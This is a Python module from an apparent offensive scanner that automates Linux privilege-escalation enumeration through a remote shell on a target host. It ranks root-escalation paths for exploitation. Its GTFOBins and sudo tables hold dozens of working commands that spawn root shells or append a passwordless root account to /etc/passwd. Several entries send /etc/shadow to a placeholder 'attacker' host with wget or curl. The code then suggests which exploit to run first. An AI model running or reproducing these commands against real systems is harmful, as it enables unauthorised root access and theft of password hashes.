"""
cyberm4fia-scanner - Privilege Escalation Scanner Module
Automated enumeration of SUID, sudo, cron, and kernel escalation vectors.
"""

from utils.colors import Colors, log_info, log_success, log_warning


# ── Known GTFOBins SUID Binaries ─────────────────────────────────────────
GTFOBINS_SUID = {
    "bash": "bash -p",
    "dash": "dash -p",
    "sh": "sh -p",
    "zsh": "zsh",
    "python": "python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
    "python2": "python2 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
    "python3": "python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
    "perl": "perl -e 'exec \"/bin/sh\";'",
    "ruby": "ruby -e 'exec \"/bin/sh\"'",
    "php": "php -r 'pcntl_exec(\"/bin/sh\", [\"-p\"]);'",
    "node": "node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: [0,1,2]})'",
    "lua": "lua -e 'os.execute(\"/bin/sh\")'",
    "vim": "vim -c ':!/bin/sh'",
    "vi": "vi -c ':!/bin/sh'",
    "nano": "nano → Ctrl+R Ctrl+X → reset; sh 1>&0 2>&0",
    "find": "find . -exec /bin/sh -p \\; -quit",
    "nmap": "nmap --interactive → !sh  (old nmap) OR nmap --script=<(echo 'os.execute(\"/bin/sh\")')",
    "awk": "awk 'BEGIN {system(\"/bin/sh\")}'",
    "less": "less /etc/passwd → !/bin/sh",
    "more": "more /etc/passwd → !/bin/sh",
    "man": "man man → !/bin/sh",
    "tar": "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
    "zip": "zip /tmp/x.zip /etc/passwd -T --unzip-command='sh -c /bin/sh'",
    "gcc": "gcc -wrapper /bin/sh,-s .",
    "env": "env /bin/sh -p",
    "cp": "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash → /tmp/rootbash -p",
    "mv": "Use to overwrite /etc/passwd with crafted entry",
    "wget": "wget --post-file=/etc/shadow http://attacker/  (exfiltrate)",
    "curl": "curl file:///etc/shadow  (read) OR curl http://attacker/ -d @/etc/shadow  (exfiltrate)",
    "tee": "echo 'hacker::0:0::/root:/bin/bash' | tee -a /etc/passwd",
    "strace": "strace -o /dev/null /bin/sh -p",
    "ltrace": "ltrace -b -L /bin/sh -p",
    "taskset": "taskset 1 /bin/sh -p",
    "time": "time /bin/sh -p",
    "timeout": "timeout 7d /bin/sh -p",
    "xargs": "xargs -a /dev/null sh -p",
    "aria2c": "aria2c --on-download-error=/bin/sh http://x",
    "busybox": "busybox sh",
    "docker": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
    "pkexec": "pkexec /bin/sh (CVE-2021-4034 PwnKit)",
    "doas": "doas /bin/sh",
    "screen": "screen → :exec !/bin/sh",
    "expect": "expect -c 'spawn /bin/sh -p;interact'",
}

# ── Sudo NOPASSWD Escalation ────────────────────────────────────────────
SUDO_EXPLOITS = {
    "ALL": "sudo su  (full root access)",
    "/bin/bash": "sudo /bin/bash",
    "/bin/sh": "sudo /bin/sh",
    "/usr/bin/python": "sudo python -c 'import pty;pty.spawn(\"/bin/bash\")'",
    "/usr/bin/python3": "sudo python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
    "/usr/bin/perl": "sudo perl -e 'exec \"/bin/bash\";'",
    "/usr/bin/ruby": "sudo ruby -e 'exec \"/bin/bash\"'",
    "/usr/bin/vi": "sudo vi → :!/bin/bash",
    "/usr/bin/vim": "sudo vim → :!/bin/bash",
    "/usr/bin/nano": "sudo nano → Ctrl+R Ctrl+X → reset; bash 1>&0 2>&0",
    "/usr/bin/less": "sudo less /etc/passwd → !/bin/bash",
    "/usr/bin/more": "sudo more /etc/passwd → !/bin/bash",
    "/usr/bin/man": "sudo man man → !/bin/bash",
    "/usr/bin/find": "sudo find / -exec /bin/bash \\; -quit",
    "/usr/bin/awk": "sudo awk 'BEGIN {system(\"/bin/bash\")}'",
    "/usr/bin/env": "sudo env /bin/bash",
    "/usr/bin/nmap": "sudo nmap --interactive → !bash",
    "/usr/bin/wget": "sudo wget --post-file=/etc/shadow http://attacker/",
    "/usr/bin/curl": "sudo curl file:///etc/shadow",
    "/usr/bin/tar": "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash",
    "/usr/bin/zip": "sudo zip /tmp/x.zip /tmp -T --unzip-command='sh -c /bin/bash'",
    "/usr/bin/docker": "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt bash",
    "/usr/bin/tee": "echo 'root2::0:0::/root:/bin/bash' | sudo tee -a /etc/passwd",
    "/usr/sbin/tcpdump": "sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /bin/bash",
    "/usr/bin/apt-get": "sudo apt-get changelog apt → !/bin/bash",
    "/usr/bin/ftp": "sudo ftp → !/bin/bash",
    "/usr/bin/ssh": "sudo ssh -o ProxyCommand=';bash 0<&2 1>&2' x",
    "/usr/bin/git": "sudo git -p help config → !/bin/bash",
    "/usr/bin/mysql": "sudo mysql -e '\\! /bin/bash'",
}


class PrivEscScanner:
    """
    Automated Privilege Escalation Scanner.
    Uses an interactive shell to enumerate escalation vectors.
    """

    def __init__(self, shell):
        """
        Args:
            shell: InteractiveShell instance with command execution capability.
        """
        self.shell = shell
        self.findings = {
            "suid": [],
            "sudo": [],
            "writable_cron": [],
            "writable_paths": [],
            "kernel": {},
            "capabilities": [],
            "suggestions": [],
        }

    def scan_suid(self):
        """Find SUID binaries and check against GTFOBins."""
        log_info("🔍 Scanning for SUID binaries...")

        output = self.shell.execute("find / -perm -4000 -type f 2>/dev/null")
        if not output:
            log_warning("  SUID scan returned no results (or command failed)")
            return []

        suid_bins = [line.strip() for line in output.split("\n") if line.strip()]
        exploitable = []

        for binary_path in suid_bins:
            binary_name = binary_path.split("/")[-1]
            if binary_name in GTFOBINS_SUID:
                exploit_cmd = GTFOBINS_SUID[binary_name]
                finding = {
                    "binary": binary_path,
                    "name": binary_name,
                    "exploit": exploit_cmd,
                    "risk": "HIGH",
                }
                exploitable.append(finding)
                log_success(f"  ⚡ {binary_path} → {exploit_cmd[:60]}")

        self.findings["suid"] = exploitable

        if exploitable:
            log_success(f"  Found {len(exploitable)} exploitable SUID binaries!")
        else:
            log_info(f"  Found {len(suid_bins)} SUID binaries, none immediately exploitable.")

        return exploitable

    def scan_sudo(self):
        """Check sudo -l for NOPASSWD entries."""
        log_info("🔍 Checking sudo permissions...")

        output = self.shell.execute("sudo -l 2>/dev/null")
        if not output:
            log_warning("  sudo -l returned nothing (may require password)")
            return []

        exploitable = []

        for line in output.split("\n"):
            line = line.strip()
            if "NOPASSWD" in line:
                # Parse the allowed commands
                for cmd_path, exploit in SUDO_EXPLOITS.items():
                    if cmd_path in line:
                        finding = {
                            "rule": line,
                            "command": cmd_path,
                            "exploit": exploit,
                            "risk": "CRITICAL" if cmd_path == "ALL" else "HIGH",
                        }
                        exploitable.append(finding)
                        log_success(f"  ⚡ NOPASSWD: {cmd_path} → {exploit[:60]}")
                        break

            # Check for (ALL) entries
            if "(ALL)" in line and "NOPASSWD" in line:
                if not any(f["risk"] == "CRITICAL" for f in exploitable):
                    exploitable.append({
                        "rule": line,
                        "command": "ALL",
                        "exploit": SUDO_EXPLOITS["ALL"],
                        "risk": "CRITICAL",
                    })
                    log_success(f"  ⚡ FULL SUDO ACCESS: {line}")

        self.findings["sudo"] = exploitable

        if exploitable:
            log_success(f"  Found {len(exploitable)} exploitable sudo entries!")
        else:
            log_info("  No exploitable NOPASSWD sudo entries found.")

        return exploitable

    def scan_writable_cron(self):
        """Check for writable cron jobs and directories."""
        log_info("🔍 Scanning for writable cron jobs...")

        cron_paths = [
            "/etc/crontab",
            "/etc/cron.d/",
            "/var/spool/cron/crontabs/",
            "/etc/cron.hourly/",
            "/etc/cron.daily/",
        ]

        writable = []

        for path in cron_paths:
            output = self.shell.execute(f"ls -la {path} 2>/dev/null && test -w {path} && echo WRITABLE")
            if output and "WRITABLE" in output:
                finding = {
                    "path": path,
                    "content": output[:500],
                    "risk": "HIGH",
                }
                writable.append(finding)
                log_success(f"  ⚡ Writable cron: {path}")

        # Check crontab content for writable scripts
        crontab_output = self.shell.execute("cat /etc/crontab 2>/dev/null")
        if crontab_output:
            for line in crontab_output.split("\n"):
                line = line.strip()
                if line and not line.startswith("#") and "/" in line:
                    # Extract script paths from crontab
                    parts = line.split()
                    for part in parts:
                        if part.startswith("/"):
                            check = self.shell.execute(f"test -w {part} 2>/dev/null && echo WRITABLE")
                            if check and "WRITABLE" in check:
                                writable.append({
                                    "path": part,
                                    "cron_line": line,
                                    "risk": "CRITICAL",
                                })
                                log_success(f"  ⚡ Writable cron script: {part}")

        self.findings["writable_cron"] = writable
        return writable

    def scan_kernel(self):
        """Get kernel version and check for known exploits."""
        log_info("🔍 Checking kernel version...")

        output = self.shell.execute("uname -r")
        if not output:
            return {}

        kernel_version = output.strip()
        log_info(f"  Kernel: {kernel_version}")

        # Known vulnerable kernel ranges (simplified)
        kernel_exploits = {
            "2.6.": [
                {"name": "Dirty COW (CVE-2016-5195)", "versions": "2.6.22 - 4.8.3"},
            ],
            "3.": [
                {"name": "Dirty COW (CVE-2016-5195)", "versions": "2.6.22 - 4.8.3"},
                {"name": "overlayfs (CVE-2015-1328)", "versions": "3.13 - 3.19"},
            ],
            "4.": [
                {"name": "Dirty COW (CVE-2016-5195)", "versions": "2.6.22 - 4.8.3"},
                {"name": "Dirty Pipe (CVE-2022-0847)", "versions": "5.8 - 5.16.10"},
            ],
            "5.": [
                {"name": "Dirty Pipe (CVE-2022-0847)", "versions": "5.8 - 5.16.10"},
                {"name": "GameOver(lay) (CVE-2023-2640)", "versions": "5.11 - 6.2"},
            ],
            "6.": [
                {"name": "GameOver(lay) (CVE-2023-2640)", "versions": "5.11 - 6.2"},
            ],
        }

        potential_exploits = []
        for prefix, exploits in kernel_exploits.items():
            if kernel_version.startswith(prefix):
                potential_exploits.extend(exploits)

        kernel_info = {
            "version": kernel_version,
            "potential_exploits": potential_exploits,
        }

        for exp in potential_exploits:
            log_success(f"  ⚡ Potential: {exp['name']} ({exp['versions']})")

        self.findings["kernel"] = kernel_info
        return kernel_info

    def scan_capabilities(self):
        """Check for Linux capabilities that can be abused."""
        log_info("🔍 Scanning for dangerous capabilities...")

        output = self.shell.execute("getcap -r / 2>/dev/null")
        if not output:
            return []

        dangerous_caps = {
            "cap_setuid": "Can change UID → escalate to root",
            "cap_setgid": "Can change GID → escalate group",
            "cap_dac_override": "Bypass file read/write/execute permissions",
            "cap_dac_read_search": "Bypass file read and directory search permissions",
            "cap_net_raw": "Can craft raw packets (sniffing/spoofing)",
            "cap_sys_admin": "Broad system administration (mount, etc.)",
            "cap_sys_ptrace": "Can trace/debug any process",
            "cap_fowner": "Bypass ownership checks on files",
        }

        exploitable = []
        for line in output.split("\n"):
            line = line.strip()
            for cap, desc in dangerous_caps.items():
                if cap in line:
                    finding = {
                        "binary": line.split(" ")[0] if " " in line else line,
                        "capability": cap,
                        "description": desc,
                        "risk": "HIGH",
                    }
                    exploitable.append(finding)
                    log_success(f"  ⚡ {line.split(' ')[0]}: {cap} → {desc[:50]}")

        self.findings["capabilities"] = exploitable
        return exploitable

    def scan_writable_paths(self):
        """Check for writable directories in PATH (PATH hijacking)."""
        log_info("🔍 Checking for PATH hijacking...")

        output = self.shell.execute("echo $PATH")
        if not output:
            return []

        writable = []
        paths = output.strip().split(":")

        for path in paths:
            if path:
                check = self.shell.execute(f"test -w {path} 2>/dev/null && echo WRITABLE")
                if check and "WRITABLE" in check:
                    writable.append({
                        "path": path,
                        "risk": "MEDIUM",
                    })
                    log_success(f"  ⚡ Writable PATH dir: {path}")

        self.findings["writable_paths"] = writable
        return writable

    def scan_all(self):
        """Run all privilege escalation scans."""
        print(f"\n{Colors.BOLD}{Colors.RED}{'═' * 55}")
        print(f"  💀 PRIVILEGE ESCALATION SCANNER")
        print(f"{'═' * 55}{Colors.END}\n")

        self.scan_suid()
        self.scan_sudo()
        self.scan_writable_cron()
        self.scan_kernel()
        self.scan_capabilities()
        self.scan_writable_paths()

        # Generate suggestions based on findings
        self._generate_suggestions()

        # Print summary
        self._print_summary()

        return self.findings

    def _generate_suggestions(self):
        """Generate ranked escalation suggestions."""
        suggestions = []

        for entry in self.findings.get("sudo", []):
            if entry["risk"] == "CRITICAL":
                suggestions.append({
                    "priority": 1,
                    "vector": "Sudo",
                    "command": entry["exploit"],
                    "risk": "CRITICAL",
                })
            else:
                suggestions.append({
                    "priority": 2,
                    "vector": "Sudo",
                    "command": entry["exploit"],
                    "risk": "HIGH",
                })

        for entry in self.findings.get("suid", []):
            suggestions.append({
                "priority": 3,
                "vector": "SUID",
                "command": entry["exploit"],
                "risk": entry["risk"],
            })

        for entry in self.findings.get("writable_cron", []):
            suggestions.append({
                "priority": 4 if entry["risk"] == "CRITICAL" else 5,
                "vector": "Cron",
                "command": f"Inject payload into {entry['path']}",
                "risk": entry["risk"],
            })

        for entry in self.findings.get("capabilities", []):
            suggestions.append({
                "priority": 5,
                "vector": "Capabilities",
                "command": f"{entry['binary']}: {entry['description']}",
                "risk": entry["risk"],
            })

        suggestions.sort(key=lambda x: x["priority"])
        self.findings["suggestions"] = suggestions

    def _print_summary(self):
        """Print a formatted summary of findings."""
        total = (
            len(self.findings["suid"])
            + len(self.findings["sudo"])
            + len(self.findings["writable_cron"])
            + len(self.findings["capabilities"])
            + len(self.findings["writable_paths"])
            + len(self.findings.get("kernel", {}).get("potential_exploits", []))
        )

        print(f"\n{Colors.BOLD}{Colors.GREEN}{'─' * 55}")
        print(f"  Privilege Escalation Scan Complete")
        print(f"{'─' * 55}{Colors.END}")
        print(f"  SUID Binaries:     {len(self.findings['suid'])} exploitable")
        print(f"  Sudo Entries:      {len(self.findings['sudo'])} exploitable")
        print(f"  Writable Cron:     {len(self.findings['writable_cron'])}")
        print(f"  Capabilities:      {len(self.findings['capabilities'])} dangerous")
        print(f"  Writable PATH:     {len(self.findings['writable_paths'])}")

        kernel = self.findings.get("kernel", {})
        if kernel:
            print(f"  Kernel Exploits:   {len(kernel.get('potential_exploits', []))} potential")

        if self.findings["suggestions"]:
            print(f"\n{Colors.BOLD}{Colors.RED}  ⚡ TOP ESCALATION PATHS:{Colors.END}")
            for i, sug in enumerate(self.findings["suggestions"][:5], 1):
                risk_color = Colors.RED if sug["risk"] == "CRITICAL" else Colors.YELLOW
                print(
                    f"  {risk_color}{i}. [{sug['risk']}] {sug['vector']}: "
                    f"{sug['command'][:60]}{Colors.END}"
                )
        print()
